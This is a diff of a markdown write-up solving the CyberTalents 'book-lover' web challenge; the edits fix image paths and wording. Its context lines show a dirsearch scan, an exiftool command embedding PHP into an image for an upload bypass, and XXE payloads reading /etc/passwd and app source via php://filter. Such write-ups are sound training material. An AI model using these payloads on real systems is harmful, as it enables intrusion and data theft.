@@ -1,14 +1,14 @@
 # Solve book-lover
 #### https://cybertalents.com/challenges/web/book-lover
 
-![alt text](image-1.png)
+![alt text](images/image-1.png)
 ### Run Directory bruteforce
 `dirsearch -u http://wcamxwl32pue3e6mgjk31eotrvmej6zqdkgxu639-web.cybertalentslabs.com -x 403,404`
 
 Nothing found 
 
 ### Try file upload .gif
-![alt text](image.png)
+![alt text](images/image.png)
 
 ### Analyze with burp
 
@@ -55,11 +55,11 @@ Bypassed!!
 ### Embed PHP code to the file 
 `exiftool -Comment="<?php show_source(./index.php); ?>" image.jpg -o exploit.php`
 
-Upload the file and Intercept the request and edit it to by pass the restriction
+Upload the file and Intercept the request and edit it to bypass the restriction
 
-![alt text](image-2.png)
+![alt text](images/image-2.png)
 
-But we can't access the uploaded files to trigger the code.
+But we can't access the directory of uploaded files to trigger the code.
 
 ### Try XXE
 
@@ -68,7 +68,7 @@ But we can't access the uploaded files to trigger the code.
 <!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
 <data>&example;</data>
 ```
-![alt text](image-3.png)
+![alt text](images/image-3.png)
 
 decode base64 with `hURL -d "<string>"`
 
@@ -103,7 +103,7 @@ Get the source code
 <data>&example;</data>
 ```
 
-![alt text](image-4.png)
+![alt text](images/image-4.png)
 
 *You can view the source in [index.php](index.php)*
 
